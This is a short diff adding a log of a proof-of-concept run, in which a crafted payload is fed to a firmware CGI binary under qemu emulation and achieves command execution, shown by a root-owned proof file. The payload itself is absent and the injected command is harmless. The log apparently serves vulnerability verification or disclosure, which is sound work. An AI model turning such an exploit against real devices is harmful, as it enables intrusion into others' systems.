@@ -1,0 +1,11 @@
+# Local qemu-mips user-mode execution of the same PoC
+# command executed on the device: echo LOCAL_QEMU_RCE_OK > /tmp/webfile_proof_local; kill -9 $PPID
+# payload: poc_1.10B02_qemu_user_rce.bin (1169 bytes)
+$ qemu-mips -L <rootfs> usr/bin/webfile_cgi.cgi < payload
+<rootfs>/usr/bin/webfile_cgi.cgi: cache '/etc/ld.so.cache' is corrupt
+/bin/bash: line 39: 133332 Killed  timeout 15 env -i ... qemu-mips ...
+exit=0 (the process being killed is expected: the payload command itself runs "kill -9 $PPID")
+
+--- proof file ---
+-rw-r--r-- 1 root root 18 Oct 14 16:53 /tmp/webfile_proof_local
+LOCAL_QEMU_RCE_OK
